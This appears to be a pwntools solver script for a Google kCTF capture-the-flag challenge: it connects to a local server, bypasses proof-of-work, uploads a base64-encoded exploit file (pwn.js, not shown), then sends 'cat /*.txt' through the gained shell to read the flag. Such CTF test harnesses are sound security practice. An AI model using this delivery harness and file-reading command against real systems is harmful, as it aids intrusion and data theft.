#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2023 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from pwn import *

flag_re = re.compile(rb'CTF{.*}')

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

script_path = os.path.dirname(os.path.realpath(__file__))

with open(os.path.join(script_path, 'pwn.js'), 'rb') as f:
  data = b64e(f.read())

r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
print(r.recvuntil(b'== proof-of-work: '))
if r.recvline().startswith(b'enabled'):
    handle_pow(r)

r.sendlineafter(b'How many bytes is your base64-encoded exploit?', str(len(data)).encode())
r.sendlineafter(b'Give me your exploit as base64!', data.encode())
r.recvuntil(b"Let's go")

r.recvuntil(b'Stack offset')
r.recvline()

r.sendline(b'cat /*.txt')
line = r.recvline()

if not flag_re.search(line):
  raise RuntimeError('Flag not found!')

print(line.strip().decode())
exit(0)
